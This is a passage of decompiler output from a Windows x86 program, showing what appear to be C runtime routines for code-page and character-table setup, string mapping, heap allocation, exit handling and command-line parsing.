		edi = fn0040A8FC(ebp, edi);
	*(fp - 0x04) = fp->dw0004;
	word32 edi_12;
	word32 ebx_13 = fn0040A935(ebp, edi, dwArg00, out edi_12);
	*(fp - 0x08) = 0xFF;
	word32 esp_16;
	byte SCZO_17;
	byte Z_18;
	word32 ecx_19;
	word32 ebp_20;
	word32 edi_21;
	word32 ebx_22;
	word32 esi_23;
	globals->ptr4110B0();
	return ebx_22;
}

// 00408193: void fn00408193(Register Eq_11 ebp, Register Eq_11 edi)
void fn00408193(Eq_11 ebp, Eq_11 edi)
{
	if (globals->dw491EC0 == 0x01)
		edi = fn0040A8FC(ebp, edi);
	*(fp - 0x04) = fp->dw0004;
	word32 edi_12;
	fn0040A935(ebp, edi, dwArg00, out edi_12);
	*(fp - 0x04) = 0xFF;
	ExitProcess(*(fp - 0x04));
}

// 004081B7: void fn004081B7(Stack word32 dwArg04)
void fn004081B7(word32 dwArg04)
{
	Eq_496 eax_21 = fn00408350(dwArg04);
	if (eax_21 == globals->t4931B8)
		return;
	if (eax_21 != 0x00)
	{
		ui32 edx_111 = 0x00;
		UINT * eax_115 = globals->a4110C0;
		do
		{
			if (*eax_115 == eax_21)
			{
				word32 ecx_258 = 0x40;
				struct Eq_6677 * edi_260 = globals->a4932E0;
				while (ecx_258 != 0x00)
				{
					edi_260->b0000 = (byte) 0x00;
					edi_260 = edi_260 + 0x01;
					ecx_258 = ecx_258 - 0x01;
				}
				edi_260->b0000 = 0x00;
				ui32 esi_266 = edx_111 * 0x03;
				byte * dwLoc08_267 = globals->a4110B8;
				struct Eq_6818 * ebx_272 = (esi_266 << 0x04) + 4264144;
				do
				{
					byte * ecx_285 = &ebx_272->b0000 + 0x01;
					if (ebx_272->b0000 != 0x00)
					{
						do
						{
							byte dl_330 = *ecx_285;
							if (dl_330 == 0x00)
								goto l004082B0;
							struct Eq_6847 * eax_335 = (word32) *ecx_285;
							struct Eq_6847 * edi_337 = (word32) dl_330;
							if (eax_335 <= edi_337)
							{
								byte dl_351 = *dwLoc08_267;
								do
								{
									eax_335[4797153] = (struct Eq_6847) (eax_335[4797153] | dl_351);
									eax_335 = eax_335 + 0x01;
								} while (eax_335 <= edi_337);
							}
							struct Eq_6855 * ecx_346 = ecx_285 + 0x01;
							ecx_285 = (byte *) &ecx_346->b0001;
						} while (ecx_346->b0001 != 0x00);
					}
l004082B0:
					byte * v22_295 = dwLoc08_267 + 0x01;
					dwLoc08_267 = v22_295;
					ebx_272 = ebx_272 + 0x01;
				} while (v22_295 < (byte *) ~0x004110B3);
				globals->dw4931CC = 0x01;
				globals->t4931B8 = eax_21;
				Eq_11 eax_305 = fn0040839A(eax_21);
				struct Eq_6893 * esi_306 = (esi_266 << 0x04) + 0x004110C4;
				globals->dw4931C0 = esi_306->dw0000;
				globals->dw4931C4 = esi_306->dw0004;
				globals->t4933E4 = eax_305;
				globals->dw4931C8 = esi_306->dw0008;
				goto l0040833F;
			}
			eax_115 = eax_115 + 0x0C;
			edx_111 = edx_111 + 0x01;
		} while (eax_115 < &globals->ptr4111B0);
		if (GetCPInfo(eax_21, fp - 0x1C) == 0x01)
		{
			globals->t4931B8 = eax_21;
			word32 ecx_144 = 0x40;
			struct Eq_6707 * edi_146 = globals->a4932E0;
			while (ecx_144 != 0x00)
			{
				edi_146->b0000 = (byte) 0x00;
				edi_146 = edi_146 + 0x01;
				ecx_144 = ecx_144 - 0x01;
			}
			edi_146->b0000 = 0x00;
			globals->t4933E4.u0 = 0x00;
			if (dwLoc1C > 0x01)
			{
				if (bLoc16 != 0x00)
				{
					byte * ecx_213 = fp - 0x15;
					do
					{
						byte dl_220 = *ecx_213;
						if (dl_220 == 0x00)
							goto l004082F6;
						struct Eq_6740 * eax_225 = (word32) *(ecx_213 - 0x01);
						struct Eq_6740 * edx_227 = (word32) dl_220;
						while (eax_225 <= edx_227)
						{
							eax_225[4797153] = (struct Eq_6740) (eax_225[4797153] | 0x04);
							eax_225 = eax_225 + 0x01;
						}
						byte * ecx_242 = ecx_213 + 0x01;
						ecx_213 = ecx_242 + 0x01;
					} while (*ecx_242 != 0x00);
				}
l004082F6:
				struct Eq_6735 * eax_195 = (struct Eq_6735 *) 0x01;
				do
				{
					eax_195[4797153] = (struct Eq_6735) (eax_195[4797153] | 0x08);
					eax_195 = eax_195 + 0x01;
				} while (eax_195 < (struct Eq_6735 *) 0xFF);
				globals->t4933E4 = fn0040839A(eax_21);
				globals->dw4931CC = 0x01;
			}
			else
				globals->dw4931CC = 0x00;
			globals->dw4931C0 = 0x00;
			globals->dw4931C4 = 0x00;
			globals->dw4931C8 = 0x00;
l0040833F:
			fn004083F6();
			return;
		}
		if (globals->dw491EC4 == 0x00)
			return;
	}
	fn004083CD();
	goto l0040833F;
}

// 00408350: Register Eq_496 fn00408350(Stack word32 dwArg04)
UINT fn00408350(word32 dwArg04)
{
	globals->dw491EC4 = globals->dw491EC4 & 0x00;
	Eq_496 eax_21 = dwArg04;
	if (dwArg04 != ~0x01)
	{
		if (dwArg04 != ~0x02)
		{
			if (dwArg04 == ~0x03)
			{
				eax_21 = globals->t491EE4;
				globals->dw491EC4 = 0x01;
			}
			return eax_21;
		}
		else
		{
			globals->dw491EC4 = 0x01;
			return GetACP();
		}
	}
	else
	{
		globals->dw491EC4 = 0x01;
		return GetOEMCP();
	}
}

// 0040839A: Register word32 fn0040839A(Stack Eq_496 dwArg04)
word32 fn0040839A(UINT dwArg04)
{
	if (dwArg04 == 0x03A4)
		return 0x0411;
	else if (dwArg04 == 0x03A8)
		return 0x0804;
	else if (dwArg04 == 949)
		return 0x0412;
	else if (dwArg04 == 0x03B6)
		return 0x0404;
	else
		return 0x00;
}

// 004083CD: void fn004083CD()
void fn004083CD()
{
	word32 ecx_15 = 0x40;
	struct Eq_6962 * edi_13 = globals->a4932E0;
	while (ecx_15 != 0x00)
	{
		edi_13->b0000 = (byte) 0x00;
		edi_13 = edi_13 + 0x01;
		ecx_15 = ecx_15 - 0x01;
	}
	edi_13->b0000 = 0x00;
	globals->t4931B8 = 0x00;
	globals->dw4931CC = 0x00;
	globals->t4933E4.u0 = 0x00;
	globals->dw4931C0 = 0x00;
	globals->dw4931C4 = 0x00;
	globals->dw4931C8 = 0x00;
	return;
}

// 004083F6: void fn004083F6()
void fn004083F6()
{
	if (GetCPInfo(globals->t4931B8, fp - 0x18) == 0x01)
	{
		Eq_7009 eax_65 = 0x00;
		byte al_66 = 0x00;
		do
		{
			*((word32) eax_65 + (fp - 0x0118)) = al_66;
			eax_65 = (word32) eax_65 + 0x01;
			al_66 = (byte) eax_65;
		} while (eax_65 < 0x0100);
		byte al_236 = bLoc12;
		if (bLoc12 != 0x00)
		{
			byte * edx_227 = fp - 0x11;
			do
			{
				Eq_7112 ecx_239 = (word32) *edx_227;
				Eq_7112 eax_241 = (word32) al_236;
				if (eax_241 <= ecx_239)
				{
					uint32 ecx_264 = ecx_239 - eax_241;
					union Eq_7115 * edi_265 = (word32) eax_241 + (fp - 0x0118);
					uint32 ecx_269 = ecx_264 + 0x01 >> 0x02;
					while (ecx_269 != 0x00)
					{
						*edi_265 = 0x20202020;
						edi_265 = (union Eq_7115 *) ((char *) edi_265 + 0x04);
						ecx_269 = ecx_269 - 0x01;
					}
					ui32 ecx_280 = ecx_264 + 0x01 & 0x03;
					while (ecx_280 != 0x00)
					{
						*edi_265 = (union Eq_7115 *) 0x20;
						edi_265 = (union Eq_7115 *) ((char *) edi_265 + 0x01);
						ecx_280 = ecx_280 - 0x01;
					}
				}
				byte * edx_251 = edx_227 + 0x01;
				edx_227 = edx_251 + 0x01;
				al_236 = *edx_251;
			} while (al_236 != 0x00);
		}
		byte dl_114;
		fn0040AA88(fp - 0x04, 0x01, fp - 0x0118, 0x0100, fp - 0x0518, globals->t4931B8, globals->t4933E4, 0x00, out dl_114);
		word32 ecx_137;
		byte dl_138;
		fn00408621(fp - 0x04, globals->t4933E4, (byte *) 0x0100, 0x01, fp - 0x0118, 0x0100, fp - 0x0218, 0x0100, globals->t4931B8, 0x00, out ecx_137, out dl_138);
		word32 ecx_161;
		byte dl_162;
		fn00408621(fp - 0x04, globals->t4933E4, (byte *) 0x0200, 0x02, fp - 0x0118, 0x0100, fp - 0x0318, 0x0100, globals->t4931B8, 0x00, out ecx_161, out dl_162);
		struct Eq_7093 * eax_165 = null;
		word16 * ecx_169 = fp - 0x0518;
l004084EC:
		byte dl_197;
		byte dl_179 = (byte) *ecx_169;
		if ((dl_179 & 0x01) != 0x00)
		{
			eax_165[4797153] = (struct Eq_7093) (eax_165[4797153] | 0x10);
			dl_197 = Mem203[fp - 0x0218 + eax_165:byte];
		}
		else
		{
			if ((dl_179 & 0x02) == 0x00)
			{
				eax_165[4796896] = (struct Eq_7093) (eax_165[4796896] & 0x00);
				goto l00408526;
			}
			eax_165[4797153] = (struct Eq_7093) (eax_165[4797153] | 0x20);
			dl_197 = Mem213[fp - 0x0318 + eax_165:byte];
		}
		eax_165[4796896] = (struct Eq_7093) dl_197;
l00408526:
		eax_165 = eax_165 + 0x01;
		ecx_169 = ecx_169 + 0x01;
		if (eax_165 < (struct Eq_7093 *) 0x0100)
			goto l004084EC;
		return;
	}
	struct Eq_7005 * eax_291 = null;
	byte al_292 = 0x00;
l00408536:
	byte cl_344;
	if (eax_291 >= (struct Eq_7005 *) 0x41 && eax_291 <= (struct Eq_7005 *) 0x5A)
	{
		eax_291[4797153] = (struct Eq_7005) (eax_291[4797153] | 0x10);
		cl_344 = al_292 + 0x20;
	}
	else
	{
		if (eax_291 < (struct Eq_7005 *) 0x61 || eax_291 > (struct Eq_7005 *) 122)
		{
			eax_291[4796896] = (struct Eq_7005) (eax_291[4796896] & 0x00);
			goto l00408573;
		}
		eax_291[4797153] = (struct Eq_7005) (eax_291[4797153] | 0x20);
		cl_344 = al_292 - 0x20;
	}
	eax_291[4796896] = (struct Eq_7005) cl_344;
l00408573:
	eax_291 = eax_291 + 0x01;
	al_292 = (byte) eax_291;
	if (eax_291 < (struct Eq_7005 *) 0x0100)
		goto l00408536;
	return;
}

// 0040857B: void fn0040857B()
void fn0040857B()
{
	if (globals->dw4931A8 == 0x00)
	{
		fn004081B7(~0x02);
		globals->dw4931A8 = 0x01;
	}
	return;
}

// 00408597: Register (ptr byte) fn00408597(Register (ptr (arr Eq_5457)) edi, Stack (ptr Eq_5287) dwArg04, Stack Eq_11 dwArg08, Stack (ptr Eq_5287) dwArg0C, Register out ptr32 ebxOut)
byte * fn00408597(Eq_5457 * edi[], Eq_5287 * dwArg04, Eq_11 dwArg08, Eq_5287 * dwArg0C, ptr32 & ebxOut)
{
	*ebxOut = ebx;
	byte * edi_101 = (word32) dwArg04 + 0x01;
	if (globals->dw4931CC == 0x00)
	{
		word32 ebx_45;
		word32 esi_46;
		ecx = fn0040ABE0(dwLoc18, dwArg04, dwArg08, dwArg0C, edi, out ebx_45, out esi_46);
	}
	else
	{
		word32 edx_106 = dwArg0C;
		if (dwArg0C != 0x00)
		{
			ecx = dwArg08 + 0x01;
			do
			{
				byte al_110 = *ecx;
				*edi_101 = al_110;
				edx_106 = edx_106 - 0x01;
				if ((((word32) al_110)->b4932E1 & 0x04) != 0x00)
				{
					edi_101 = edi_101;
					ecx = ecx;
					if (edx_106 == 0x00)
					{
						*(edi_101 - 0x01) = *(edi_101 - 0x01) & 0x00;
						break;
					}
					byte al_132 = *ecx;
					*edi_101 = al_132;
					edx_106 = edx_106 - 0x01;
					edi_101 = edi_101 + 0x01;
					ecx = ecx + 0x01;
					if (al_132 == 0x00)
					{
						*(edi_101 - 0x01) = *(edi_101 - 0x01) & 0x00;
						break;
					}
				}
				else
				{
					edi_101 = edi_101 + 0x01;
					ecx = ecx + 0x01;
					if (al_110 == 0x00)
						break;
				}
			} while (edx_106 != 0x00);
		}
		uint32 edx_68 = edx_106 - 0x01;
		if (edx_106 != 0x00)
		{
			uint32 ecx_89 = edx_68 + 0x01 >> 0x02;
			while (ecx_89 != 0x00)
			{
				*edi_101 = (byte) 0x00;
				edi_101 = edi_101 + 0x04;
				ecx_89 = ecx_89 - 0x01;
			}
			ecx = edx_68 + 0x01 & 0x03;
			while (ecx != null)
			{
				*edi_101 = 0x00;
				edi_101 = edi_101 + 0x01;
				ecx = ecx - 0x01;
			}
		}
	}
	return ecx;
}

// 00408621: Register Eq_11 fn00408621(Register ptr32 ebp, Stack Eq_11 dwArg04, Stack (ptr byte) dwArg08, Stack byte bArg09, Stack (ptr byte) dwArg0C, Stack word32 dwArg10, Stack ptr32 dwArg14, Stack word32 dwArg18, Stack Eq_496 dwArg1C, Stack word32 dwArg20, Register out ptr32 ecxOut, Register out Eq_5692 dlOut)
Eq_11 fn00408621(ptr32 ebp, Eq_11 dwArg04, byte * dwArg08, byte bArg09, byte * dwArg0C, word32 dwArg10, ptr32 dwArg14, word32 dwArg18, UINT dwArg1C, word32 dwArg20, ptr32 & ecxOut, Eq_5692 & dlOut)
{
	*dlOut = dl;
	Eq_11 eax_149;
	ptr32 eax_14 = fs->ptr0000;
	fs->ptr0000 = fp - 0x14;
	if (globals->dw491EC8 == 0x00)
	{
		if (LCMapStringW(0x00, 0x0100, &globals->t40D248, 0x01, null, 0x00) != 0x00)
			globals->dw491EC8 = 0x01;
		else
		{
			if (LCMapStringA(0x00, 0x0100, 0x0040D244, 0x01, 0x00, 0x00) == 0x00)
				goto l004087AF;
			globals->dw491EC8 = 0x02;
		}
	}
	if (dwArg10 > 0x00)
	{
		byte dl_368;
		dwArg10 = fn00408845(dwArg0C, dwArg10, out dl_368);
	}
	word32 eax_122 = globals->dw491EC8;
	if (eax_122 == 0x02)
	{
		eax_149 = LCMapStringA(dwArg04, dwArg08, dwArg0C, dwArg10, dwArg14, dwArg18);
		goto l004087B1;
	}
	if (eax_122 == 0x01)
	{
		if (dwArg1C == 0x00)
			dwArg1C = globals->t491EE4;
		int32 eax_184 = MultiByteToWideChar(dwArg1C, (0x00 - (-dwArg20 == 0x00) & 0x08) + 0x01, dwArg0C, dwArg10, null, 0x00);
		if (eax_184 == 0x00)
			goto l004087AF;
		word32 eax_192 = eax_184 * 0x02 + 0x03;
		fn00407B80(DPB(eax_192, (byte) eax_192 & 252, 0), 0x00);
		if (fp == 0x3C)
			goto l004087AF;
		*(fp - 0x40) = eax_184;
		*(fp - 0x44) = fp - 0x3C;
		*(fp - 0x48) = dwArg10;
		*(fp - 0x4C) = (union Eq_15 *) dwArg0C;
		*(fp - 0x50) = 0x01;
		*(fp - 0x54) = (uint32) dwArg1C;
		if (MultiByteToWideChar(*(fp - 0x54), *(fp - 0x50), *(fp - 0x4C), *(fp - 0x48), *(fp - 0x44), *(fp - 0x40)) != 0x00)
		{
			*(fp - 0x40) = 0x00;
			*(fp - 0x44) = 0x00;
			*(fp - 0x48) = eax_184;
			*(fp - 0x4C) = fp - 0x3C;
			*(fp - 0x50) = (union Eq_15 *) dwArg08;
			*(fp - 0x54) = (union Eq_11 *) dwArg04;
			Eq_11 eax_243 = LCMapStringW(*(fp - 0x54), *(fp - 0x50), *(fp - 0x4C), *(fp - 0x48), *(fp - 0x44), *(fp - 0x40));
			Eq_11 esi_245 = eax_243;
			if (eax_243 == 0x00)
				goto l004087AF;
			if ((bArg09 & 0x04) != 0x00)
			{
				if (dwArg18 != 0x00)
				{
					if (eax_243 > dwArg18)
						goto l004087AF;
					*(fp - 0x40) = (union Eq_11 *) dwArg18;
					*(fp - 0x44) = (union Eq_11 *) dwArg14;
					*(fp - 0x48) = eax_184;
					*(fp - 0x4C) = fp - 0x3C;
					*(fp - 0x50) = (union Eq_15 *) dwArg08;
					*(fp - 0x54) = (union Eq_11 *) dwArg04;
					if (LCMapStringW(*(fp - 0x54), *(fp - 0x50), *(fp - 0x4C), *(fp - 0x48), *(fp - 0x44), *(fp - 0x40)) == 0x00)
						goto l004087AF;
				}
			}
			else
			{
				word32 eax_293 = eax_243 * 0x02 + 0x03;
				fn00407B80(DPB(eax_293, (byte) eax_293 & 252, 0), ebp);
				if (fp == 0x3C)
					goto l004087AF;
				*(fp - 0x40) = (union Eq_11 *) eax_243;
				*(fp - 0x44) = fp - 0x3C;
				*(fp - 0x48) = eax_184;
				*(fp - 0x4C) = fp - 0x3C;
				*(fp - 0x50) = (union Eq_15 *) dwArg08;
				*(fp - 0x54) = (union Eq_11 *) dwArg04;
				if (LCMapStringW(*(fp - 0x54), *(fp - 0x50), *(fp - 0x4C), *(fp - 0x48), *(fp - 0x44), *(fp - 0x40)) == 0x00)
					goto l004087AF;
				*(fp - 0x40) = 0x00;
				*(fp - 0x44) = 0x00;
				if (dwArg18 == 0x00)
				{
					*(fp - 0x48) = 0x00;
					*(fp - 0x4C) = 0x00;
				}
				else
				{
					*(fp - 0x48) = (union Eq_11 *) dwArg18;
					*(fp - 0x4C) = (union Eq_11 *) dwArg14;
				}
				*(fp - 0x50) = (union Eq_11 *) eax_243;
				*(fp - 0x54) = fp - 0x3C;
				*(fp - 88) = 0x0220;
				*(fp - 0x5C) = (uint32) dwArg1C;
				Eq_11 eax_345 = WideCharToMultiByte(*(fp - 0x5C), *(fp - 88), *(fp - 0x54), *(fp - 0x50), *(fp - 0x4C), *(fp - 0x48), *(fp - 0x44), *(fp - 0x40));
				esi_245 = eax_345;
				if (eax_345 == 0x00)
					goto l004087AF;
			}
			eax_149 = esi_245;
l004087B1:
			fs->ptr0000 = eax_14;
			word32 ecx_61;
			*ecxOut = eax_14;
			return eax_149;
		}
	}
l004087AF:
	eax_149.u0 = 0x00;
	goto l004087B1;
}

// 00408845: Register ptr32 fn00408845(Stack Eq_15 dwArg04, Stack int32 dwArg08, Register out Eq_7470 dlOut)
ptr32 fn00408845(Eq_15 dwArg04, int32 dwArg08, Eq_7470 & dlOut)
{
	byte dl_4;
	*dlOut = (byte) dwArg08;
	byte * eax_17 = dwArg04;
	word32 ecx_13 = dwArg08 - 0x01;
	if (dwArg08 != 0x00)
	{
		do
		{
			if (*eax_17 == 0x00)
				goto l00408862;
			eax_17 = eax_17 + 0x01;
			ecx_13 = ecx_42 - 0x01;
			word32 ecx_42 = ecx_13;
		} while (ecx_42 != 0x00);
	}
	if (*eax_17 != 0x00)
		return dwArg08;
	else
		return eax_17 - dwArg04;
}

// 00408870: Register ui32 fn00408870(Stack int32 dwArg04, Stack word16 wArg06, Stack word32 dwArg08, Register out Eq_5664 dlOut)
ui32 fn00408870(int32 dwArg04, word16 wArg06, word32 dwArg08, Eq_5664 & dlOut)
{
	*dlOut = dl;
	ui32 eax_127;
	if (dwArg04 <= ~0xFE)
		eax_127 = (word32) globals->ptr4111B0[dwArg04].t0000;
	else
	{
		word32 dwLoc0C_136;
		if ((globals->ptr4111B0[(word32) (byte) (dwArg04 >> 0x08)].b0001 & 0x80) != 0x00)
			dwLoc0C_136 = 0x02;
		else
			dwLoc0C_136 = 0x01;
		byte dl_116;
		ui32 eax_117 = fn0040AA88(fp - 0x04, 0x01, fp - 0x08, dwLoc0C_136, fp + 0x06, 0x00, 0x00, 0x01, out dl_116);
		if (eax_117 == 0x00)
			return eax_117;
		eax_127 = (word32) wArg06;
	}
	return eax_127 & dwArg08;
}

// 00409204: Register word32 fn00409204(Register Eq_11 ebp, Stack Eq_11 dwArg04, Register out ptr32 ebpOut, Register out ptr32 ediOut)
word32 fn00409204(Eq_11 ebp, Eq_11 dwArg04, ptr32 & ebpOut, ptr32 & ediOut)
{
	*ebpOut = ebp;
	*ediOut = edi;
	if (dwArg04 != 0x00)
	{
		word32 eax_42 = fn0040B1D3(dwArg04);
		if (eax_42 != 0x00)
		{
			fn0040B1FE(ebp, eax_42, dwArg04, bLoc05);
			return ebx;
		}
		HeapFree(globals->t493084, 0x00, dwArg04);
	}
	return ebx;
}

// 00409233: Register word32 fn00409233(Stack Eq_11 dwArg04)
word32 fn00409233(Eq_11 dwArg04)
{
	return fn00409245(dwArg04);
}

// 00409245: Register word32 fn00409245(Stack word32 dwArg04)
word32 fn00409245(word32 dwArg04)
{
	word32 eax_11;
	if (dwArg04 <= ~0x1F)
	{
		do
		{
			*(fp - 0x04) = fp->dw0004;
			eax_11 = fn00409271(dwArg00);
			if (eax_11 != 0x00 || fp->dw0008 == eax_11)
				return eax_11;
			*(fp - 0x04) = fp->dw0004;
		} while (fn0040B9DE(dwArg00) != 0x00);
	}
	eax_11 = 0x00;
	return eax_11;
}

// 00409271: Register Eq_261 fn00409271(Stack word32 dwArg04)
Eq_261 fn00409271(word32 dwArg04)
{
	Eq_261 eax_22;
	uint32 esi_33 = dwArg04;
	if (dwArg04 <= globals->dw4117C0)
	{
		eax_22 = fn0040B529(dwArg04, dwArg04, SLICE(dwArg04, byte, 24));
		if (eax_22 != 0x00)
			return eax_22;
	}
	if (dwArg04 == 0x00)
		esi_33 = 0x01;
	eax_22 = HeapAlloc(globals->t493084, 0x00, esi_33 + 0x0F & ~0x0F);
	return eax_22;
}

// 00409E2C: Register word32 fn00409E2C()
word32 fn00409E2C()
{
	ptr32 esp_1 = fp;
	<anonymous> * eax_3 = globals->ptr4931B4;
	if (eax_3 != null)
	{
		word32 eax_27;
		byte SZO_28;
		byte C_29;
		byte Z_30;
		byte SCZO_31;
		eax_3();
	}
	word32 * esp_14 = esp_1 - 0x04;
	*esp_14 = 0x0040E014;
	*(esp_14 - 0x04) = 0x0040E008;
	fn00409F14(dwArg00);
	*(esp_14 - 0x08) = 0x0040E004;
	*(esp_14 - 0x0C) = 0x0040E000;
	fn00409F14(dwArg00);
	return esi;
}

// 00409E59: void fn00409E59(Register word32 edi, Stack word32 dwArg04)
void fn00409E59(word32 edi, word32 dwArg04)
{
	fn00409E7B(edi, dwArg04, 0x00, 0x00);
	return;
}

// 00409E7B: void fn00409E7B(Register word32 edi, Stack word32 dwArg04, Stack word32 dwArg08, Stack word32 dwArg0C)
void fn00409E7B(word32 edi, word32 dwArg04, word32 dwArg08, word32 dwArg0C)
{
	if (globals->dw491F34 == 0x01)
		TerminateProcess(GetCurrentProcess(), dwArg04);
	globals->dw491F30 = 0x01;
	globals->b491F2C = (byte) dwArg0C;
	ptr32 esp_19 = fp - 0x08;
	word32 ebx_101 = dwArg0C;
	if (dwArg08 == 0x00)
	{
		word32 * eax_56 = globals->ptr4931B0;
		if (eax_56 != null)
		{
			uint32 ecx_79 = globals->dw4931AC;
			ptr32 esp_103 = fp - 0x0C;
			word32 * esi_110 = ecx_79 - 0x04;
			if (ecx_79 - 0x04 >= eax_56)
			{
				do
				{
					<anonymous> * eax_104 = *esi_110;
					if (eax_104 != null)
					{
						word32 edi_121;
						byte SCZO_122;
						byte Z_123;
						word32 eax_124;
						byte bl_126;
						byte SZO_127;
						byte C_128;
						word32 ecx_129;
						eax_104();
					}
					esi_110 = esi_110 - 0x04;
				} while (esi_110 >= globals->ptr4931B0);
			}
			esp_19 = esp_103 + 0x04;
		}
		word32 * esp_71 = esp_19 - 0x04;
		*esp_71 = 0x0040E020;
		*(esp_71 - 0x04) = 0x0040E018;
		fn00409F14(dwArg00);
		esp_19 = esp_71 + 0x01;
	}
	struct Eq_8198 * esp_36 = esp_19 - 0x04;
	esp_36->dw0000 = 0x0040E028;
	*(esp_36 - 0x04) = 0x0040E024;
	fn00409F14(dwArg00);
	if (ebx_101 != 0x00)
		return;
	else
	{
		esp_36->t0004 = esp_36->t0010;
		globals->dw491F34 = 0x01;
		ExitProcess(esp_36->t0004);
	}
}

// 00409F14: void fn00409F14(Stack word32 dwArg04)
void fn00409F14(word32 dwArg04)
{
	struct Eq_8283 * esp_13 = fp - 0x04;
	word32 * esi_14 = dwArg04;
	while (esi_14 < esp_13->ptr000C)
	{
		<anonymous> * eax_18 = *esi_14;
		if (eax_18 != null)
		{
			byte SCZO_32;
			byte C_33;
			word32 eax_34;
			byte SZO_35;
			byte Z_36;
			eax_18();
		}
		esi_14 = esi_14 + 0x01;
	}
	return;
}

// 00409F2E: Register Eq_15 fn00409F2E(Stack word32 dwArg04, Stack word32 dwArg08)
Eq_15 fn00409F2E(word32 dwArg04, word32 dwArg08)
{
	Eq_15 eax_31;
	struct _EXCEPTION_POINTERS * eax_108 = fn0040A06F(dwArg04);
	if (eax_108 != null)
	{
		<anonymous> * ebx_54 = eax_108->ptr0008;
		if (ebx_54 != null)
		{
			if (ebx_54 == (<anonymous> *) 0x05)
			{
				eax_108->ptr0008 = eax_108->ptr0008 & 0x00;
				eax_31.u0 = 0x01;
			}
			else
			{
				if (ebx_54 != (<anonymous> *) 0x01)
				{
					struct _EXCEPTION_POINTERS * ecx_87 = globals->ptr491F38;
					globals->ptr491F38 = dwArg08;
					word32 ecx_91 = eax_108->ContextRecord;
					if (ecx_91 == 0x08)
					{
						int32 ecx_110 = globals->dw411458;
						int32 edx_112 = globals->dw41145C + ecx_110;
						if (ecx_110 < edx_112)
						{
							int32 edx_167 = edx_112 - ecx_110;
							struct Eq_8389 * esi_169 = ecx_110 * 0x03 * 0x04 + 4264936;
							do
							{
								esi_169->dw0000 = esi_169->dw0000 & 0x00;
								esi_169 = esi_169 + 0x01;
								edx_167 = edx_167 - 0x01;
							} while (edx_167 != 0x00);
						}
						word32 eax_119 = eax_108->ExceptionRecord;
						if (eax_119 == 0xC000008E)
							globals->dw411464 = 131;
						else if (eax_119 == 0xC0000090)
							globals->dw411464 = 0x81;
						else if (eax_119 == 0xC0000091)
							globals->dw411464 = 0x84;
						else if (eax_119 == 0xC0000093)
							globals->dw411464 = 133;
						else if (eax_119 == 0xC000008D)
							globals->dw411464 = 0x82;
						else if (eax_119 == 0xC000008F)
							globals->dw411464 = 0x86;
						else if (eax_119 == 0xC0000092)
							globals->dw411464 = 0x8A;
						word32 esp_128;
						word32 ebp_129;
						word32 ebx_130;
						word32 eax_131;
						byte SZO_132;
						byte C_133;
						word32 ecx_134;
						byte Z_135;
						byte SCZO_136;
						word32 edx_137;
						word32 esi_138;
						byte SO_139;
						ebx_54();
						globals->dw411464 = esi_138;
					}
					else
					{
						eax_108->ptr0008 = eax_108->ptr0008 & 0x00;
						word32 esp_186;
						word32 ebp_187;
						word32 ebx_188;
						word32 eax_189;
						byte SZO_190;
						byte C_191;
						word32 ecx_192;
						byte Z_193;
						byte SCZO_194;
						word32 edx_195;
						word32 esi_196;
						byte SO_197;
						ebx_54();
					}
					globals->ptr491F38 = ecx_87;
					eax_108 = ecx_87;
				}
				eax_31 = eax_108 | ~0x00;
			}
			return eax_31;
		}
	}
	eax_31 = UnhandledExceptionFilter(dwArg08);
	return eax_31;
}

// 0040A06F: Register (ptr Eq_8459) fn0040A06F(Stack word32 dwArg04)
Eq_8459 * fn0040A06F(word32 dwArg04)
{
	ui32 ecx_5 = globals->dw411460;
	struct Eq_8459 * eax_11 = &globals->dw4113E0;
	if (globals->dw4113E0 != dwArg04)
	{
		struct Eq_8459 * esi_34 = ecx_5 * 0x03 * 0x04 + 0x004113E0;
		do
			eax_11 = eax_11 + 0x01;
		while (eax_11 >= esi_34 || eax_11->dw0000 == dwArg04);
	}
	if (eax_11 >= (ecx_5 * 0x03) * 0x04 + 0x004113E0 || eax_11->dw0000 != dwArg04)
		eax_11 = null;
	return eax_11;
}

// 0040A0B2: Register Eq_11 fn0040A0B2()
Eq_11 fn0040A0B2()
{
	if (globals->dw4931A8 == 0x00)
		fn0040857B();
	Eq_11 esi_24 = globals->t4933E8;
	cu8 al_9 = *esi_24;
	if (al_9 == 0x22)
	{
		while (true)
		{
			byte al_57 = *((word32) esi_24 + 0x01);
			esi_24 = (word32) esi_24 + 0x01;
			if (al_57 == 0x22 || al_57 == 0x00)
				break;
			if (fn0040BC76((word32) al_57) != 0x00)
				esi_24 = (word32) esi_24 + 0x01;
		}
		if (*esi_24 == 0x22)
		{
l0040A0EF:
			esi_24 = (word32) esi_24 + 0x01;
		}
	}
	else if (al_9 > 0x20)
	{
		do
			esi_24 = (word32) esi_24 + 0x01;
		while (*esi_24 > 0x20);
	}
	cu8 al_25 = *esi_24;
	if (al_25 == 0x00 || al_25 > 0x20)
		return esi_24;
	goto l0040A0EF;
}

// 0040A10A: Register Eq_11 fn0040A10A(Register word32 ebx, Register Eq_11 ebp)
Eq_11 fn0040A10A(word32 ebx, Eq_11 ebp)
{
	Eq_11 ebx_112 = 0x00;
	byte bl_111 = 0x00;
	if (globals->dw4931A8 == 0x00)
		fn0040857B();
	Eq_11 esi_16 = globals->t491EB8;
	Eq_11 edi_17 = 0x00;
	while (true)
	{
		byte al_32 = *esi_16;
		if (al_32 == 0x00)
			break;
		if (al_32 != 0x3D)
			edi_17 = (word32) edi_17 + 0x01;
		byte dl_42;
		esi_16 = (word32) fn00407460(esi_16, out dl_42) + ((word32) esi_16 + 0x01);
	}
	Eq_11 eax_52 = fn00409233(edi_17 * 0x04 + 0x04);
	globals->t491F14 = eax_52;
	Eq_11 esi_100 = eax_52;
	if (eax_52 == 0x00)
	{
		*(fp - 0x10) = 0x09;
		word32 edi_160;
		ebx_112 = fn0040816E(ebp, edi_17, out esi_100, out edi_160);
		bl_111 = (byte) ebx_112;
	}
	Eq_11 edi_113 = globals->t491EB8;
	if (*edi_113 != bl_111)
	{
		*(fp - 0x10) = (union Eq_11 *) ebp;
		do
		{
			*(fp - 0x14) = (union Eq_11 *) edi_113;
			byte dl_103;
			Eq_15 eax_104 = fn00407460(dwArg00, out dl_103);
			if (*edi_113 != 0x3D)
			{
				*(fp - 0x14) = (word32) eax_104 + 0x01;
				Eq_11 eax_125 = fn00409233(dwArg00);
				*esi_100 = eax_125;
				if (eax_125 == ebx_112)
				{
					*(fp - 0x14) = 0x09;
					ebx_112 = fn0040816E((word32) eax_104 + 0x01, edi_113, out esi_100, out edi_113);
					bl_111 = (byte) ebx_112;
				}
				*(fp - 0x14) = (union Eq_11 *) edi_113;
